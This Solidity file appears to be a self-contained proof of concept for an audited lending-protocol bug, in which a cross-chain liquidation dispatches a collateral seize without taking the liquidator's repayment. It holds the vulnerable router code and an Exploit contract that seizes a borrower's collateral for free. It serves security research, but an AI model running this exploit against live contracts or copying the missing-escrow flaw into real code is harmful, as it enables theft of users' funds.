// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LEND (Lend-V2) finding 58379 (H-10):
// "Malicious liquidator can liquidate without providing collateral".
//
// Real audited source (the vulnerable liquidation entry-point and its internal
// helpers are reproduced VERBATIM; the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fns    liquidateCrossChain (L172-192), _validateAndPrepareLiquidation
//          (L197-233), _executeLiquidation (L235-243), _prepareLiquidationValues
//          (L245-259), _executeLiquidationCore (L264-285)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/636
//
// Root cause: on Chain B (the debt chain) the cross-chain liquidation entry-point
// validates the borrower's position and immediately dispatches a seize message to
// Chain A, but it NEVER transfers / escrows the repayment token from the
// liquidator. The seize on Chain A executes as an INDEPENDENT LayerZero message
// and hands the borrower's collateral to the liquidator. The return
// LiquidationSuccess message then tries to pull the repayment from the liquidator
// on Chain B via transferFrom — if the liquidator never approved, that message
// reverts forever while the Chain-A seize is already committed. Net effect: the
// liquidator receives the liquidatee's collateral for free and the borrower's
// debt is never deducted.
//
// The vulnerable Chain-B functions below are byte-for-byte the on-chain source.
// Non-vulnerable dependencies (LendStorage accessors, the Lendtroller seize-token
// math, the Chain-A seize handler, the LayerZero transport, and the repayment
// pull) are faithful minimal doubles: real ERC20 transfers, real accounting.
// ─────────────────────────────────────────────────────────────────────────────

// ── Compound ExponentialNoError subset used by the verbatim math ─────────────
abstract contract ExponentialNoError {
    uint256 internal constant expScale = 1e18;

    struct Exp {
        uint256 mantissa;
    }

    function mul_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return a * b.mantissa / expScale;
    }

    function mul_ScalarTruncate(Exp memory a, uint256 scalar) internal pure returns (uint256) {
        return a.mantissa * scalar / expScale;
    }
}

// ── Faithful minimal ERC20 double (collateral + borrowed underlying) ─────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // Reverts (allowance underflow) if the caller was never approved — this is
    // exactly how the Chain-B repayment fails for an un-approving liquidator.
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ── Faithful double of the borrowed-asset lToken (interest accrual + index) ──
contract LToken {
    uint256 public borrowIndex = 1e18;

    function accrueInterest() external {}
}

// ── Faithful double of the Lendtroller (close factor + seize-token math) ─────
contract Lendtroller {
    uint256 public constant closeFactorMantissa = 0.5e18; // 50%

    // 1:1 seize for the reproduction: repayAmount worth of collateral is seized.
    function liquidateCalculateSeizeTokens(address, address, uint256 repayAmount)
        external
        pure
        returns (uint256, uint256)
    {
        return (0, repayAmount);
    }
}

// ── Faithful double of LendStorage: structs + the accessors the verbatim
//    Chain-B liquidation path reads. ───────────────────────────────────────
contract LendStorage {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    struct LiquidationParams {
        address borrower;
        uint256 repayAmount;
        uint32 srcEid;
        address lTokenToSeize;
        address borrowedAsset;
        uint256 storedBorrowIndex;
        uint256 borrowPrinciple;
        address borrowedlToken;
    }

    mapping(address => address) internal _underlyingTolToken;
    mapping(address => address) internal _lTokenToUnderlying;
    mapping(address => uint256) internal _maxLiquidation;
    mapping(address => Borrow[]) internal _crossChainCollaterals; // keyed by borrower

    function setUnderlyingMap(address underlying, address lToken) external {
        _underlyingTolToken[underlying] = lToken;
        _lTokenToUnderlying[lToken] = underlying;
    }

    function setMaxLiquidation(address borrower, uint256 amount) external {
        _maxLiquidation[borrower] = amount;
    }

    function pushCrossChainCollateral(address borrower, Borrow calldata b) external {
        _crossChainCollaterals[borrower].push(b);
    }

    function underlyingTolToken(address underlying) external view returns (address) {
        return _underlyingTolToken[underlying];
    }

    function lTokenToUnderlying(address lToken) external view returns (address) {
        return _lTokenToUnderlying[lToken];
    }

    function getCrossChainCollaterals(address borrower, address) external view returns (Borrow[] memory) {
        return _crossChainCollaterals[borrower];
    }

    function getMaxLiquidationRepayAmount(address borrower, address, bool) external view returns (uint256) {
        return _maxLiquidation[borrower];
    }

    function crossChainLTokenMap(address lToken, uint32) external pure returns (address) {
        return lToken; // Chain-A version of the collateral lToken (identity double)
    }
}

// ── Faithful double of the Chain-A router: receives the seize message as an
//    INDEPENDENT LayerZero delivery, seizes the borrower's collateral and hands
//    the liquidator share to the liquidator, then queues LiquidationSuccess. ──
contract SourceChainRouter is ExponentialNoError {
    uint256 public constant PROTOCOL_SEIZE_SHARE_MANTISSA = 2.8e16; // 2.8%

    MiniToken public collateral;
    bytes[] public outbox; // LiquidationSuccess messages back to Chain B

    constructor(MiniToken collateral_) {
        collateral = collateral_;
    }

    // Faithful reduction of _handleLiquidationExecute: seize share math is
    // verbatim; the collateral movement to the liquidator is a real transfer.
    function deliverLiquidationExecute(bytes calldata payload) external {
        (
            uint256 amount,
            uint256 borrowIndex,
            uint256 col,
            address sender,
            address destlToken,
            address liquidator,
            address srcToken,
        ) = abi.decode(payload, (uint256, uint256, uint256, address, address, address, address, uint8));

        uint256 protocolSeizeShare = mul_(amount, Exp({mantissa: PROTOCOL_SEIZE_SHARE_MANTISSA}));
        require(protocolSeizeShare < amount, "Invalid protocol share");
        uint256 liquidatorShare = amount - protocolSeizeShare;

        // The liquidatee's collateral is transferred to the liquidator on Chain A.
        collateral.transfer(liquidator, liquidatorShare);

        // Queue LiquidationSuccess back to Chain B (independent LZ message).
        outbox.push(abi.encode(amount, borrowIndex, col, sender, destlToken, liquidator, srcToken, uint8(4)));
    }

    function outboxLength() external view returns (uint256) {
        return outbox.length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE Chain-B router. The liquidation entry-point and its internal
// helpers are reproduced VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter is ExponentialNoError {
    enum ContractType {
        BorrowCrossChain,
        ValidBorrowRequest,
        DestRepay,
        CrossChainLiquidationExecute,
        LiquidationSuccess,
        LiquidationFailure
    }

    LendStorage public lendStorage;
    address public lendtroller;
    SourceChainRouter public source;
    MiniToken public borrowToken;

    // Chain-B debt book: borrower => outstanding borrow principle.
    mapping(address => uint256) public borrowerDebt;

    constructor(LendStorage ls_, address lendtroller_, SourceChainRouter source_, MiniToken borrowToken_) {
        lendStorage = ls_;
        lendtroller = lendtroller_;
        source = source_;
        borrowToken = borrowToken_;
    }

    function setBorrowerDebt(address borrower, uint256 amount) external {
        borrowerDebt[borrower] = amount;
    }

    // ═══════════════════ VERBATIM: CrossChainRouter.sol L172-192 ═══════════════
    function liquidateCrossChain(
        address borrower,
        uint256 repayAmount,
        uint32 srcEid,
        address lTokenToSeize,
        address borrowedAsset
    ) external {
        LendStorage.LiquidationParams memory params = LendStorage.LiquidationParams({
            borrower: borrower,
            repayAmount: repayAmount,
            srcEid: srcEid,
            lTokenToSeize: lTokenToSeize, // Collateral lToken from the user's position to seize
            borrowedAsset: borrowedAsset,
            storedBorrowIndex: 0,
            borrowPrinciple: 0,
            borrowedlToken: address(0)
        });

        _validateAndPrepareLiquidation(params);
        _executeLiquidation(params); // @> VULN: liquidation is executed (collateral-seize dispatched to the source chain) with NO transfer/escrow of the repayment token from the liquidator (msg.sender)
    }

    // ═══════════════════ VERBATIM: CrossChainRouter.sol L197-233 ═══════════════
    function _validateAndPrepareLiquidation(LendStorage.LiquidationParams memory params) private view {
        require(params.borrower != msg.sender, "Liquidator cannot be borrower");
        require(params.repayAmount > 0, "Repay amount cannot be zero");

        // Get the lToken for the borrowed asset on this chain
        params.borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);
        require(params.borrowedlToken != address(0), "Invalid borrowed asset");

        // Important: Use underlying token addresses consistently
        address borrowedUnderlying = lendStorage.lTokenToUnderlying(params.borrowedlToken);

        // Verify the borrow position exists and get details
        LendStorage.Borrow[] memory userCrossChainCollaterals =
            lendStorage.getCrossChainCollaterals(params.borrower, borrowedUnderlying);
        bool found = false;

        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (userCrossChainCollaterals[i].srcEid == params.srcEid) {
                found = true;
                params.storedBorrowIndex = userCrossChainCollaterals[i].borrowIndex;
                params.borrowPrinciple = userCrossChainCollaterals[i].principle;
                break;
            }
            unchecked {
                ++i;
            }
        }
        require(found, "No matching borrow position");

        // Validate liquidation amount against close factor
        uint256 maxLiquidationAmount = lendStorage.getMaxLiquidationRepayAmount(
            params.borrower,
            params.borrowedlToken,
            false // cross-chain liquidation
        );
        require(params.repayAmount <= maxLiquidationAmount, "Exceeds max liquidation");
    }

    // ═══════════════════ VERBATIM: CrossChainRouter.sol L235-243 ═══════════════
    function _executeLiquidation(LendStorage.LiquidationParams memory params) private {
        // First part: Validate and prepare liquidation parameters
        uint256 maxLiquidation = _prepareLiquidationValues(params);

        require(params.repayAmount <= maxLiquidation, "Exceeds max liquidation");

        // Secon part: Validate collateral and execute liquidation
        _executeLiquidationCore(params);
    }

    // ═══════════════════ VERBATIM: CrossChainRouter.sol L245-259 ═══════════════
    function _prepareLiquidationValues(LendStorage.LiquidationParams memory params)
        private
        returns (uint256 maxLiquidation)
    {
        // Accrue interest
        LTokenInterface(params.borrowedlToken).accrueInterest();
        uint256 currentBorrowIndex = LTokenInterface(params.borrowedlToken).borrowIndex();

        // Calculate current borrow value with accrued interest
        uint256 currentBorrow = (params.borrowPrinciple * currentBorrowIndex) / params.storedBorrowIndex;

        // Verify repay amount is within limits
        maxLiquidation = mul_ScalarTruncate(
            Exp({mantissa: LendtrollerInterfaceV2(lendtroller).closeFactorMantissa()}), currentBorrow
        );

        return maxLiquidation;
    }

    // ═══════════════════ VERBATIM: CrossChainRouter.sol L264-285 ═══════════════
    function _executeLiquidationCore(LendStorage.LiquidationParams memory params) private {
        // Calculate seize tokens
        address borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);

        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);

        require(amountSeizeError == 0, "Seize calculation failed");

        // Send message to Chain A to execute the seize
        _send(
            params.srcEid,
            seizeTokens,
            params.storedBorrowIndex,
            0,
            params.borrower,
            lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
            msg.sender,
            params.borrowedAsset,
            ContractType.CrossChainLiquidationExecute
        );
    }

    // ── Faithful double of _send: encodes the LZPayload exactly like the real
    //    code and hands it to the transport (here: the Chain-A router). No token
    //    is escrowed here either — matching the audited source. ──────────────
    function _send(
        uint32 _dstEid,
        uint256 _amount,
        uint256 _borrowIndex,
        uint256 _collateral,
        address _sender,
        address _destlToken,
        address _liquidator,
        address _srcToken,
        ContractType ctype
    ) internal {
        bytes memory payload =
            abi.encode(_amount, _borrowIndex, _collateral, _sender, _destlToken, _liquidator, _srcToken, uint8(ctype));
        source.deliverLiquidationExecute(payload); // independent LZ delivery to Chain A
    }

    // ── Faithful reduction of _handleLiquidationSuccess -> repayCrossChain...
    //    -> repayBorrowInternal: the repayment PULLS tokens from the liquidator.
    //    With no approval this transferFrom reverts, so this independent Chain-B
    //    message reverts forever and the debt is never deducted. ─────────────
    function deliverLiquidationSuccess(bytes calldata payload) external {
        (uint256 amount,,, address sender,, address liquidator,,) =
            abi.decode(payload, (uint256, uint256, uint256, address, address, address, address, uint8));

        // Transfer tokens from the liquidator to the contract (repayment).
        borrowToken.transferFrom(liquidator, address(this), amount);

        // Only reached on a successful pull: deduct the borrower's debt.
        borrowerDebt[sender] -= amount;
    }
}

// Interfaces the verbatim Chain-B code casts to.
interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

interface LendtrollerInterfaceV2 {
    function closeFactorMantissa() external view returns (uint256);
    function liquidateCalculateSeizeTokens(address, address, uint256) external view returns (uint256, uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: acts as the malicious liquidator. It calls the verbatim
// liquidateCrossChain WITHOUT holding or approving any repayment token, relays
// the resulting LayerZero messages as independent deliveries, and proves it
// walks away with the liquidatee's seized collateral for free while the
// borrower's debt is never deducted.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit is ExponentialNoError {
    MiniToken public collateral; // child nonce 1  (PROFIT token — seized from the liquidatee)
    MiniToken public borrowToken; // child nonce 2
    LendStorage public lendStorage; // child nonce 3
    Lendtroller public lendtroller; // child nonce 4
    LToken public lToken; // child nonce 5
    SourceChainRouter public source; // child nonce 6  (Chain A)
    CrossChainRouter public router; // child nonce 7  (Chain B — VULN)

    address internal constant BORROWER = address(0xB0770);

    uint32 internal constant SRC_EID = 1; // Chain A endpoint id
    uint256 internal constant PRINCIPLE = 100e18; // borrower's outstanding debt
    uint256 internal constant REPAY_AMOUNT = 50e18; // 50% close factor
    uint256 internal constant COLLATERAL_ON_A = 50e18; // liquidatee's collateral on Chain A

    uint256 public liquidatorGain; // collateral the liquidator receives for free
    uint256 public liquidatorPaid; // repayment the liquidator actually provided
    uint256 public debtAfter; // borrower debt after the whole flow
    uint256 public profit;

    constructor() {
        collateral = new MiniToken("Collateral", "COL"); // nonce 1
        borrowToken = new MiniToken("Borrowed", "BRW"); // nonce 2
        lendStorage = new LendStorage(); // nonce 3
        lendtroller = new Lendtroller(); // nonce 4
        lToken = new LToken(); // nonce 5
        source = new SourceChainRouter(collateral); // nonce 6
        router = new CrossChainRouter(lendStorage, address(lendtroller), source, borrowToken); // nonce 7

        // Wire the Chain-B storage: borrowed underlying <-> lToken, the borrower's
        // cross-chain borrow position, and the max-liquidation allowance.
        lendStorage.setUnderlyingMap(address(borrowToken), address(lToken));
        lendStorage.pushCrossChainCollateral(
            BORROWER,
            LendStorage.Borrow({
                srcEid: SRC_EID,
                destEid: 2,
                principle: PRINCIPLE,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: address(collateral)
            })
        );
        lendStorage.setMaxLiquidation(BORROWER, REPAY_AMOUNT);
        router.setBorrowerDebt(BORROWER, PRINCIPLE);

        // The liquidatee's collateral sits on Chain A, ready to be seized.
        collateral.mint(address(source), COLLATERAL_ON_A);
    }

    function run() external {
        // The malicious liquidator (this contract) holds NO borrow token and
        // grants NO approval — it never intends to pay the repayment.

        // 1) Trigger the cross-chain liquidation on Chain B. The verbatim path
        //    validates the position and dispatches the seize to Chain A without
        //    escrowing anything from the liquidator.
        router.liquidateCrossChain(BORROWER, REPAY_AMOUNT, SRC_EID, address(collateral), address(borrowToken));

        // 2) Relay the Chain-A LiquidationSuccess message back to Chain B. This
        //    tries to pull the repayment from the liquidator and reverts (no
        //    approval); the seize on Chain A is already committed, so we swallow
        //    the failure — exactly like a stuck LayerZero message.
        require(source.outboxLength() == 1, "seize not dispatched");
        try router.deliverLiquidationSuccess(source.outbox(0)) {
            liquidatorPaid = REPAY_AMOUNT;
        } catch {
            liquidatorPaid = 0; // repayment reverted — nothing was ever provided
        }

        liquidatorGain = collateral.balanceOf(address(this));
        debtAfter = router.borrowerDebt(BORROWER);
        profit = liquidatorGain;

        // HARM: the liquidator seized the liquidatee's collateral for free
        // (2.8% protocol share withheld => 48.6e18) while paying nothing and the
        // borrower's debt was never deducted.
        require(liquidatorPaid == 0, "liquidator paid the repayment");
        require(liquidatorGain == 48.6e18, "liquidator did not receive free collateral");
        require(debtAfter == PRINCIPLE, "borrower debt was deducted");
    }
}
